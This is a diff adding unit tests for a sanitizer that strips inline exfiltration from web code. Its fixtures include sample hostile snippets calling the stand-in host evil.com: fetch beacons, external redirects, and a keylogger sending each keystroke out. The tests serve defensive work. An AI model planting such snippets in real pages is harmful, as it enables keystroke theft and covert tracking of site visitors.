@@ -97,4 +97,70 @@ describe('removeInlineExfil', () => {
       removeInlineExfil(code, { source: code, relPath: 'test.html', mainHost: 'example.com' }, ast, log);
     }
   });
+
+  // ── DEC-1 (T-9): удаление exfil-вызова не должно ломать синтаксис ──
+  it('DEC-1: var x = fetch(external) → валидный JS (не "var x = ;")', () => {
+    const code = `var x = fetch('https://evil.com/track');`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 't.js')).not.toBeNull(); // синтаксис валиден
+  });
+
+  it('DEC-1: exfil в логическом выражении (a && fetch) → валидный JS', () => {
+    const code = `ready && fetch('https://evil.com/x');`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('DEC-1: var x = fetch(external); keep(); — keep() и присваивание не съедаются', () => {
+    const code = `var x = fetch('https://evil.com/x'); keep();`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(out).toContain('void 0'); // вызов нейтрализован, не вырезан вместе с keep()
+    expect(out).toContain('keep');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('DEC-1: standalone fetch по-прежнему удаляется целиком', () => {
+    const code = `fetch('https://evil.com/x'); keep();`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(out).not.toContain('void 0'); // целый statement убран, не нейтрализован
+    expect(out).toContain('keep');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  // ── RED-1 / KEY-1: внешний редирект и keylogger у владельца не легит → нейтрализуем ──
+  it('RED-1: внешний редирект location.href= нейтрализуется, остальное цело', () => {
+    const code = `location.href = 'https://evil.com/offer'; doStuff();`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(out).toContain('doStuff');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('RED-1: location.assign(external) нейтрализуется', () => {
+    const { code: out, removed } = run(`location.assign('https://evil.com/x');`);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+  });
+
+  it('KEY-1: keylogger document.onkeydown + fetch нейтрализуется', () => {
+    const code = `document.onkeydown = function(e){ fetch('https://evil.com/k?'+e.key); };`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('НЕ-регресс: редирект на свой хост не трогаем', () => {
+    const { removed } = run(`location.href = '/thank-you';`);
+    expect(removed).toBe(0);
+  });
 });
